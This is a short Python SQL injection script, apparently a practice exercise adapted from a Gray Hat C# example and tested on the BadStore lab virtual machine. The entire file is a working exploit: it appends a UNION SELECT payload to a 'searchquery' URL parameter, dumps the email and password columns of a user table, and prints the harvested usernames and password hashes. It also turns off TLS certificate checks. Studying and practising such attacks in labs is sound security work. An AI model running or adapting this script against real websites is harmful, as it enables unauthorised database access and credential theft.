#!/usr/bin/python3
# based on the C# example from Gray Hat C#, chapter 2
# Example requires you to manually enumerate the db and table, maybe can be improved?
# teste don badstore vm - https://www.vulnhub.com/entry/badstore-123,41/

import requests
import argparse
import re
import binascii

def main(args):
    # format parameters into a dictionary for passing with the requests module
    params = args.url.split("?")[1]
    params = dict(i.split('=') for i in params.split('&'))
    # formats url string
    url = ""
    if args.https:
        url += "https://"
    else:
        url += "http://"
    url += args.url.split("?")[0]
    # define regex keys and value to insert into SQLi request
    front = r"frONtstUFF"
    mid = r"mIDDlestUff"
    end = r"endSTuFF"
    frontHex = binascii.hexlify(b"frONtstUFF").decode()
    midHex = binascii.hexlify(b"mIDDlestUff").decode()
    endHex = binascii.hexlify(b"endSTuFF").decode()
    # SQLi payload
    payload = "' UNION ALL SELECT"
    payload += " NULL, NULL, NULL, CONCAT(0x" + frontHex + ", IFNULL(CAST(email AS"
    payload += " CHAR), 0x20),0x" + midHex + ", IFNULL(CAST(passwd AS"
    payload += " CHAR), 0x20), 0x" + endHex + ") FROM badstoredb.userdb-- "
    # Appends SQLi payload onto vulnerable parameter
    for key in params.keys():
        if "searchquery" in key:
            params[key] += payload
    # sends request
    r = requests.get(url, params, verify=False)
    # defiens regex search value
    re_test = front + r"(.*?)" + mid + r"(.*?)" + end
    # searches response fpr regex search value
    test = re.findall(re_test, r.text)
    # prints database username and pass
    for item in test:
        print("Username: " + item[0] + "\tPassword Hash: " + item[1])

if __name__ == "__main__":
    # take full url, with get parameters, as an argument
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='url with parameters to be tested')
    parser.add_argument('--https', required=False, help='specify https')
    args = parser.parse_args()
    main(args)
